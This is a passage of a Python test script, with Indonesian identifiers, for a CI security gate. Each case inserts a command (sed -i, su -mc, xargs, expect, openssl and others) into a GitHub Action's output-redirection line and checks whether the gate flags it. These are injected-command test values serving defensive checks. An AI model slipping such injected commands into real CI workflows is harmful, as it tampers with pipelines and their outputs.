        sub281 = klon(tmp, "sub281")
        berkas_aksi281 = os.path.join(
            sub281, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi281, encoding="utf-8") as f:
            isi_aksi281 = f.read()
        baris_aksi281 = [b for b in isi_aksi281.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru281 = isi_aksi281.replace(
                baris_aksi281,
                baris_aksi281.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(patch -i tambal.patch; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru281 != isi_aksi281, \
            "suntikan aksi281 tidak menembak"
        with open(berkas_aksi281, "w", encoding="utf-8") as f:
            f.write(isi_baru281)
        rc, out = jalan(sub281,
                        [sys.executable, GERBANG, "--semua"])
        periksa("patch -i berkas: gerbang lolos (Audit 1131)", rc == 0)
        shutil.rmtree(sub281, ignore_errors=True)
        sub282 = klon(tmp, "sub282")
        berkas_aksi282 = os.path.join(
            sub282, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi282, encoding="utf-8") as f:
            isi_aksi282 = f.read()
        baris_aksi282 = [b for b in isi_aksi282.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru282 = isi_aksi282.replace(
                baris_aksi282,
                baris_aksi282.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(addr2line --target elf64-x86-64 -e /bin/true; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru282 != isi_aksi282, \
            "suntikan aksi282 tidak menembak"
        with open(berkas_aksi282, "w", encoding="utf-8") as f:
            f.write(isi_baru282)
        rc, out = jalan(sub282,
                        [sys.executable, GERBANG, "--semua"])
        periksa("addr2line --target: gerbang gagal (Audit 1132)", rc != 0)
        shutil.rmtree(sub282, ignore_errors=True)
        sub283 = klon(tmp, "sub283")
        berkas_aksi283 = os.path.join(
            sub283, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi283, encoding="utf-8") as f:
            isi_aksi283 = f.read()
        baris_aksi283 = [b for b in isi_aksi283.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru283 = isi_aksi283.replace(
                baris_aksi283,
                baris_aksi283.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(addr2line -e /bin/true 0x1234; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru283 != isi_aksi283, \
            "suntikan aksi283 tidak menembak"
        with open(berkas_aksi283, "w", encoding="utf-8") as f:
            f.write(isi_baru283)
        rc, out = jalan(sub283,
                        [sys.executable, GERBANG, "--semua"])
        periksa("addr2line beralamat: gerbang lolos (Audit 1132)", rc == 0)
        shutil.rmtree(sub283, ignore_errors=True)
        sub284 = klon(tmp, "sub284")
        berkas_aksi284 = os.path.join(
            sub284, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi284, encoding="utf-8") as f:
            isi_aksi284 = f.read()
        baris_aksi284 = [b for b in isi_aksi284.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru284 = isi_aksi284.replace(
                baris_aksi284,
                baris_aksi284.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(diff --label '<a>' --label '<b>' berkas.txt -; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru284 != isi_aksi284, \
            "suntikan aksi284 tidak menembak"
        with open(berkas_aksi284, "w", encoding="utf-8") as f:
            f.write(isi_baru284)
        rc, out = jalan(sub284,
                        [sys.executable, GERBANG, "--semua"])
        periksa("diff label berkutip <: gerbang gagal (Audit 1133)", rc != 0)
        shutil.rmtree(sub284, ignore_errors=True)
        sub285 = klon(tmp, "sub285")
        berkas_aksi285 = os.path.join(
            sub285, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi285, encoding="utf-8") as f:
            isi_aksi285 = f.read()
        baris_aksi285 = [b for b in isi_aksi285.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru285 = isi_aksi285.replace(
                baris_aksi285,
                baris_aksi285.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(diff berkas.txt berkas2.txt; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru285 != isi_aksi285, \
            "suntikan aksi285 tidak menembak"
        with open(berkas_aksi285, "w", encoding="utf-8") as f:
            f.write(isi_baru285)
        rc, out = jalan(sub285,
                        [sys.executable, GERBANG, "--semua"])
        periksa("diff dua berkas: gerbang lolos (Audit 1133)", rc == 0)
        shutil.rmtree(sub285, ignore_errors=True)
        sub286 = klon(tmp, "sub286")
        berkas_aksi286 = os.path.join(
            sub286, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi286, encoding="utf-8") as f:
            isi_aksi286 = f.read()
        baris_aksi286 = [b for b in isi_aksi286.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru286 = isi_aksi286.replace(
                baris_aksi286,
                baris_aksi286.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(xargs -a - echo; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru286 != isi_aksi286, \
            "suntikan aksi286 tidak menembak"
        with open(berkas_aksi286, "w", encoding="utf-8") as f:
            f.write(isi_baru286)
        rc, out = jalan(sub286,
                        [sys.executable, GERBANG, "--semua"])
        periksa("xargs -a -: gerbang gagal (Audit 1134)", rc != 0)
        shutil.rmtree(sub286, ignore_errors=True)
        sub287 = klon(tmp, "sub287")
        berkas_aksi287 = os.path.join(
            sub287, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi287, encoding="utf-8") as f:
            isi_aksi287 = f.read()
        baris_aksi287 = [b for b in isi_aksi287.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru287 = isi_aksi287.replace(
                baris_aksi287,
                baris_aksi287.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(xargs -a daftar echo; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru287 != isi_aksi287, \
            "suntikan aksi287 tidak menembak"
        with open(berkas_aksi287, "w", encoding="utf-8") as f:
            f.write(isi_baru287)
        rc, out = jalan(sub287,
                        [sys.executable, GERBANG, "--semua"])
        periksa("xargs -a berkas: gerbang lolos (Audit 1134)", rc == 0)
        shutil.rmtree(sub287, ignore_errors=True)
        sub288 = klon(tmp, "sub288")
        berkas_aksi288 = os.path.join(
            sub288, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi288, encoding="utf-8") as f:
            isi_aksi288 = f.read()
        baris_aksi288 = [b for b in isi_aksi288.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru288 = isi_aksi288.replace(
                baris_aksi288,
                baris_aksi288.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(openssl dgst - -sign; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru288 != isi_aksi288, \
            "suntikan aksi288 tidak menembak"
        with open(berkas_aksi288, "w", encoding="utf-8") as f:
            f.write(isi_baru288)
        rc, out = jalan(sub288,
                        [sys.executable, GERBANG, "--semua"])
        periksa("dgst opsi menggantung: gerbang lolos (Audit 1135)", rc == 0)
        shutil.rmtree(sub288, ignore_errors=True)
        sub289 = klon(tmp, "sub289")
        berkas_aksi289 = os.path.join(
            sub289, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi289, encoding="utf-8") as f:
            isi_aksi289 = f.read()
        baris_aksi289 = [b for b in isi_aksi289.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru289 = isi_aksi289.replace(
                baris_aksi289,
                baris_aksi289.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(comm - --output-delimiter; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru289 != isi_aksi289, \
            "suntikan aksi289 tidak menembak"
        with open(berkas_aksi289, "w", encoding="utf-8") as f:
            f.write(isi_baru289)
        rc, out = jalan(sub289,
                        [sys.executable, GERBANG, "--semua"])
        periksa("comm opsi menggantung: gerbang lolos (Audit 1135)", rc == 0)
        shutil.rmtree(sub289, ignore_errors=True)
        sub290 = klon(tmp, "sub290")
        berkas_aksi290 = os.path.join(
            sub290, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi290, encoding="utf-8") as f:
            isi_aksi290 = f.read()
        baris_aksi290 = [b for b in isi_aksi290.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru290 = isi_aksi290.replace(
                baris_aksi290,
                baris_aksi290.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(gpg --print-md --homedir; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru290 != isi_aksi290, \
            "suntikan aksi290 tidak menembak"
        with open(berkas_aksi290, "w", encoding="utf-8") as f:
            f.write(isi_baru290)
        rc, out = jalan(sub290,
                        [sys.executable, GERBANG, "--semua"])
        periksa("gpg opsi menggantung: gerbang lolos (Audit 1135)", rc == 0)
        shutil.rmtree(sub290, ignore_errors=True)
        sub291 = klon(tmp, "sub291")
        berkas_aksi291 = os.path.join(
            sub291, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi291, encoding="utf-8") as f:
            isi_aksi291 = f.read()
        baris_aksi291 = [b for b in isi_aksi291.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru291 = isi_aksi291.replace(
                baris_aksi291,
                baris_aksi291.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(openssl dgst -; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru291 != isi_aksi291, \
            "suntikan aksi291 tidak menembak"
        with open(berkas_aksi291, "w", encoding="utf-8") as f:
            f.write(isi_baru291)
        rc, out = jalan(sub291,
                        [sys.executable, GERBANG, "--semua"])
        periksa("dgst - kontrol: gerbang gagal (Audit 1135)", rc != 0)
        shutil.rmtree(sub291, ignore_errors=True)
        sub292 = klon(tmp, "sub292")
        berkas_aksi292 = os.path.join(
            sub292, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi292, encoding="utf-8") as f:
            isi_aksi292 = f.read()
        baris_aksi292 = [b for b in isi_aksi292.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru292 = isi_aksi292.replace(
                baris_aksi292,
                baris_aksi292.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(vim --help; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru292 != isi_aksi292, \
            "suntikan aksi292 tidak menembak"
        with open(berkas_aksi292, "w", encoding="utf-8") as f:
            f.write(isi_baru292)
        rc, out = jalan(sub292,
                        [sys.executable, GERBANG, "--semua"])
        periksa("vim --help: gerbang lolos (Audit 1136)", rc == 0)
        shutil.rmtree(sub292, ignore_errors=True)
        sub293 = klon(tmp, "sub293")
        berkas_aksi293 = os.path.join(
            sub293, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi293, encoding="utf-8") as f:
            isi_aksi293 = f.read()
        baris_aksi293 = [b for b in isi_aksi293.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru293 = isi_aksi293.replace(
                baris_aksi293,
                baris_aksi293.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(sqlite3 --version; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru293 != isi_aksi293, \
            "suntikan aksi293 tidak menembak"
        with open(berkas_aksi293, "w", encoding="utf-8") as f:
            f.write(isi_baru293)
        rc, out = jalan(sub293,
                        [sys.executable, GERBANG, "--semua"])
        periksa("sqlite3 --version: gerbang lolos (Audit 1136)", rc == 0)
        shutil.rmtree(sub293, ignore_errors=True)
        sub294 = klon(tmp, "sub294")
        berkas_aksi294 = os.path.join(
            sub294, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi294, encoding="utf-8") as f:
            isi_aksi294 = f.read()
        baris_aksi294 = [b for b in isi_aksi294.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru294 = isi_aksi294.replace(
                baris_aksi294,
                baris_aksi294.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(patch --help; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru294 != isi_aksi294, \
            "suntikan aksi294 tidak menembak"
        with open(berkas_aksi294, "w", encoding="utf-8") as f:
            f.write(isi_baru294)
        rc, out = jalan(sub294,
                        [sys.executable, GERBANG, "--semua"])
        periksa("patch --help: gerbang lolos (Audit 1136)", rc == 0)
        shutil.rmtree(sub294, ignore_errors=True)
        sub295 = klon(tmp, "sub295")
        berkas_aksi295 = os.path.join(
            sub295, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi295, encoding="utf-8") as f:
            isi_aksi295 = f.read()
        baris_aksi295 = [b for b in isi_aksi295.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru295 = isi_aksi295.replace(
                baris_aksi295,
                baris_aksi295.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(openssl x509 -help; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru295 != isi_aksi295, \
            "suntikan aksi295 tidak menembak"
        with open(berkas_aksi295, "w", encoding="utf-8") as f:
            f.write(isi_baru295)
        rc, out = jalan(sub295,
                        [sys.executable, GERBANG, "--semua"])
        periksa("openssl x509 -help: gerbang lolos (Audit 1136)", rc == 0)
        shutil.rmtree(sub295, ignore_errors=True)
        sub296 = klon(tmp, "sub296")
        berkas_aksi296 = os.path.join(
            sub296, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi296, encoding="utf-8") as f:
            isi_aksi296 = f.read()
        baris_aksi296 = [b for b in isi_aksi296.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru296 = isi_aksi296.replace(
                baris_aksi296,
                baris_aksi296.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(vim; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru296 != isi_aksi296, \
            "suntikan aksi296 tidak menembak"
        with open(berkas_aksi296, "w", encoding="utf-8") as f:
            f.write(isi_baru296)
        rc, out = jalan(sub296,
                        [sys.executable, GERBANG, "--semua"])
        periksa("vim telanjang kontrol: gerbang gagal (Audit 1136)", rc != 0)
        shutil.rmtree(sub296, ignore_errors=True)
        sub297 = klon(tmp, "sub297")
        berkas_aksi297 = os.path.join(
            sub297, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi297, encoding="utf-8") as f:
            isi_aksi297 = f.read()
        baris_aksi297 = [b for b in isi_aksi297.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru297 = isi_aksi297.replace(
                baris_aksi297,
                baris_aksi297.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(basenc --base64 berkas; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru297 != isi_aksi297, \
            "suntikan aksi297 tidak menembak"
        with open(berkas_aksi297, "w", encoding="utf-8") as f:
            f.write(isi_baru297)
        rc, out = jalan(sub297,
                        [sys.executable, GERBANG, "--semua"])
        periksa("basenc beroperand: gerbang lolos (Audit 1137)", rc == 0)
        shutil.rmtree(sub297, ignore_errors=True)
        sub298 = klon(tmp, "sub298")
        berkas_aksi298 = os.path.join(
            sub298, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi298, encoding="utf-8") as f:
            isi_aksi298 = f.read()
        baris_aksi298 = [b for b in isi_aksi298.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru298 = isi_aksi298.replace(
                baris_aksi298,
                baris_aksi298.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(basenc --base64; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru298 != isi_aksi298, \
            "suntikan aksi298 tidak menembak"
        with open(berkas_aksi298, "w", encoding="utf-8") as f:
            f.write(isi_baru298)
        rc, out = jalan(sub298,
                        [sys.executable, GERBANG, "--semua"])
        periksa("basenc polos bermode: gerbang gagal (Audit 1137)", rc != 0)
        shutil.rmtree(sub298, ignore_errors=True)
        sub299 = klon(tmp, "sub299")
        berkas_aksi299 = os.path.join(
            sub299, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi299, encoding="utf-8") as f:
            isi_aksi299 = f.read()
        baris_aksi299 = [b for b in isi_aksi299.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru299 = isi_aksi299.replace(
                baris_aksi299,
                baris_aksi299.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(basenc --base64 -; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru299 != isi_aksi299, \
            "suntikan aksi299 tidak menembak"
        with open(berkas_aksi299, "w", encoding="utf-8") as f:
            f.write(isi_baru299)
        rc, out = jalan(sub299,
                        [sys.executable, GERBANG, "--semua"])
        periksa("basenc operand -: gerbang gagal (Audit 1137)", rc != 0)
        shutil.rmtree(sub299, ignore_errors=True)
        sub300 = klon(tmp, "sub300")
        berkas_aksi300 = os.path.join(
            sub300, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi300, encoding="utf-8") as f:
            isi_aksi300 = f.read()
        baris_aksi300 = [b for b in isi_aksi300.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru300 = isi_aksi300.replace(
                baris_aksi300,
                baris_aksi300.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(sed -i s/a/b/; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru300 != isi_aksi300, \
            "suntikan aksi300 tidak menembak"
        with open(berkas_aksi300, "w", encoding="utf-8") as f:
            f.write(isi_baru300)
        rc, out = jalan(sub300,
                        [sys.executable, GERBANG, "--semua"])
        periksa("sed -i tanpa berkas: gerbang lolos (Audit 1138)", rc == 0)
        shutil.rmtree(sub300, ignore_errors=True)
        sub301 = klon(tmp, "sub301")
        berkas_aksi301 = os.path.join(
            sub301, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi301, encoding="utf-8") as f:
            isi_aksi301 = f.read()
        baris_aksi301 = [b for b in isi_aksi301.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru301 = isi_aksi301.replace(
                baris_aksi301,
                baris_aksi301.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(sed -i s/a/b/ berkas; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru301 != isi_aksi301, \
            "suntikan aksi301 tidak menembak"
        with open(berkas_aksi301, "w", encoding="utf-8") as f:
            f.write(isi_baru301)
        rc, out = jalan(sub301,
                        [sys.executable, GERBANG, "--semua"])
        periksa("sed -i berberkas: gerbang lolos (Audit 1138)", rc == 0)
        shutil.rmtree(sub301, ignore_errors=True)
        sub302 = klon(tmp, "sub302")
        berkas_aksi302 = os.path.join(
            sub302, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi302, encoding="utf-8") as f:
            isi_aksi302 = f.read()
        baris_aksi302 = [b for b in isi_aksi302.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru302 = isi_aksi302.replace(
                baris_aksi302,
                baris_aksi302.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(sed s/a/b/; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru302 != isi_aksi302, \
            "suntikan aksi302 tidak menembak"
        with open(berkas_aksi302, "w", encoding="utf-8") as f:
            f.write(isi_baru302)
        rc, out = jalan(sub302,
                        [sys.executable, GERBANG, "--semua"])
        periksa("sed polos kontrol: gerbang gagal (Audit 1138)", rc != 0)
        shutil.rmtree(sub302, ignore_errors=True)
        sub303 = klon(tmp, "sub303")
        berkas_aksi303 = os.path.join(
            sub303, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi303, encoding="utf-8") as f:
            isi_aksi303 = f.read()
        baris_aksi303 = [b for b in isi_aksi303.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru303 = isi_aksi303.replace(
                baris_aksi303,
                baris_aksi303.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(sort --files0-from=daftar; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru303 != isi_aksi303, \
            "suntikan aksi303 tidak menembak"
        with open(berkas_aksi303, "w", encoding="utf-8") as f:
            f.write(isi_baru303)
        rc, out = jalan(sub303,
                        [sys.executable, GERBANG, "--semua"])
        periksa("sort --files0-from berkas: gerbang lolos (Audit 1139)", rc == 0)
        shutil.rmtree(sub303, ignore_errors=True)
        sub304 = klon(tmp, "sub304")
        berkas_aksi304 = os.path.join(
            sub304, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi304, encoding="utf-8") as f:
            isi_aksi304 = f.read()
        baris_aksi304 = [b for b in isi_aksi304.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru304 = isi_aksi304.replace(
                baris_aksi304,
                baris_aksi304.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(wc --files0-from daftar; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru304 != isi_aksi304, \
            "suntikan aksi304 tidak menembak"
        with open(berkas_aksi304, "w", encoding="utf-8") as f:
            f.write(isi_baru304)
        rc, out = jalan(sub304,
                        [sys.executable, GERBANG, "--semua"])
        periksa("wc --files0-from berkas: gerbang lolos (Audit 1139)", rc == 0)
        shutil.rmtree(sub304, ignore_errors=True)
        sub305 = klon(tmp, "sub305")
        berkas_aksi305 = os.path.join(
            sub305, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi305, encoding="utf-8") as f:
            isi_aksi305 = f.read()
        baris_aksi305 = [b for b in isi_aksi305.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru305 = isi_aksi305.replace(
                baris_aksi305,
                baris_aksi305.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(sort --files0-from=-; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru305 != isi_aksi305, \
            "suntikan aksi305 tidak menembak"
        with open(berkas_aksi305, "w", encoding="utf-8") as f:
            f.write(isi_baru305)
        rc, out = jalan(sub305,
                        [sys.executable, GERBANG, "--semua"])
        periksa("sort --files0-from=-: gerbang gagal (Audit 1139)", rc != 0)
        shutil.rmtree(sub305, ignore_errors=True)
        sub306 = klon(tmp, "sub306")
        berkas_aksi306 = os.path.join(
            sub306, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi306, encoding="utf-8") as f:
            isi_aksi306 = f.read()
        baris_aksi306 = [b for b in isi_aksi306.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru306 = isi_aksi306.replace(
                baris_aksi306,
                baris_aksi306.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(su -mc 'sort berkas'; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru306 != isi_aksi306, \
            "suntikan aksi306 tidak menembak"
        with open(berkas_aksi306, "w", encoding="utf-8") as f:
            f.write(isi_baru306)
        rc, out = jalan(sub306,
                        [sys.executable, GERBANG, "--semua"])
        periksa("su -mc sort: gerbang lolos (Audit 1140)", rc == 0)
        shutil.rmtree(sub306, ignore_errors=True)
        sub307 = klon(tmp, "sub307")
        berkas_aksi307 = os.path.join(
            sub307, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi307, encoding="utf-8") as f:
            isi_aksi307 = f.read()
        baris_aksi307 = [b for b in isi_aksi307.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru307 = isi_aksi307.replace(
                baris_aksi307,
                baris_aksi307.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(su -mc 'cat'; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru307 != isi_aksi307, \
            "suntikan aksi307 tidak menembak"
        with open(berkas_aksi307, "w", encoding="utf-8") as f:
            f.write(isi_baru307)
        rc, out = jalan(sub307,
                        [sys.executable, GERBANG, "--semua"])
        periksa("su -mc cat: gerbang gagal (Audit 1140)", rc != 0)
        shutil.rmtree(sub307, ignore_errors=True)
        sub308 = klon(tmp, "sub308")
        berkas_aksi308 = os.path.join(
            sub308, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi308, encoding="utf-8") as f:
            isi_aksi308 = f.read()
        baris_aksi308 = [b for b in isi_aksi308.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru308 = isi_aksi308.replace(
                baris_aksi308,
                baris_aksi308.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(su -c 'sort berkas'; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru308 != isi_aksi308, \
            "suntikan aksi308 tidak menembak"
        with open(berkas_aksi308, "w", encoding="utf-8") as f:
            f.write(isi_baru308)
        rc, out = jalan(sub308,
                        [sys.executable, GERBANG, "--semua"])
        periksa("su -c sort kontrol: gerbang lolos (Audit 1140)", rc == 0)
        shutil.rmtree(sub308, ignore_errors=True)
        sub309 = klon(tmp, "sub309")
        berkas_aksi309 = os.path.join(
            sub309, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi309, encoding="utf-8") as f:
            isi_aksi309 = f.read()
        baris_aksi309 = [b for b in isi_aksi309.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru309 = isi_aksi309.replace(
                baris_aksi309,
                baris_aksi309.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(uniq --group berkas; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru309 != isi_aksi309, \
            "suntikan aksi309 tidak menembak"
        with open(berkas_aksi309, "w", encoding="utf-8") as f:
            f.write(isi_baru309)
        rc, out = jalan(sub309,
                        [sys.executable, GERBANG, "--semua"])
        periksa("uniq --group beroperand: gerbang lolos (Audit 1141)", rc == 0)
        shutil.rmtree(sub309, ignore_errors=True)
        sub310 = klon(tmp, "sub310")
        berkas_aksi310 = os.path.join(
            sub310, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi310, encoding="utf-8") as f:
            isi_aksi310 = f.read()
        baris_aksi310 = [b for b in isi_aksi310.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru310 = isi_aksi310.replace(
                baris_aksi310,
                baris_aksi310.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(uniq --group; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru310 != isi_aksi310, \
            "suntikan aksi310 tidak menembak"
        with open(berkas_aksi310, "w", encoding="utf-8") as f:
            f.write(isi_baru310)
        rc, out = jalan(sub310,
                        [sys.executable, GERBANG, "--semua"])
        periksa("uniq --group polos: gerbang gagal (Audit 1141)", rc != 0)
        shutil.rmtree(sub310, ignore_errors=True)
        sub311 = klon(tmp, "sub311")
        berkas_aksi311 = os.path.join(
            sub311, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi311, encoding="utf-8") as f:
            isi_aksi311 = f.read()
        baris_aksi311 = [b for b in isi_aksi311.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru311 = isi_aksi311.replace(
                baris_aksi311,
                baris_aksi311.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(expect -c 'puts x' -f -; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru311 != isi_aksi311, \
            "suntikan aksi311 tidak menembak"
        with open(berkas_aksi311, "w", encoding="utf-8") as f:
            f.write(isi_baru311)
        rc, out = jalan(sub311,
                        [sys.executable, GERBANG, "--semua"])
        periksa("expect -c 'puts x' -f -: gerbang gagal (Audit 1145)", rc != 0)
        shutil.rmtree(sub311, ignore_errors=True)
        sub312 = klon(tmp, "sub312")
        berkas_aksi312 = os.path.join(
            sub312, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi312, encoding="utf-8") as f:
            isi_aksi312 = f.read()
        baris_aksi312 = [b for b in isi_aksi312.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru312 = isi_aksi312.replace(
                baris_aksi312,
                baris_aksi312.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(expect -c 'puts x'; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru312 != isi_aksi312, \
            "suntikan aksi312 tidak menembak"
        with open(berkas_aksi312, "w", encoding="utf-8") as f:
            f.write(isi_baru312)
        rc, out = jalan(sub312,
                        [sys.executable, GERBANG, "--semua"])
        periksa("expect -c 'puts x': gerbang lolos (Audit 1145)", rc == 0)
        shutil.rmtree(sub312, ignore_errors=True)
        sub313 = klon(tmp, "sub313")
        berkas_aksi313 = os.path.join(
            sub313, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi313, encoding="utf-8") as f:
            isi_aksi313 = f.read()
        baris_aksi313 = [b for b in isi_aksi313.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru313 = isi_aksi313.replace(
                baris_aksi313,
                baris_aksi313.replace(
                    '>> "$GITHUB_OUTPUT"',
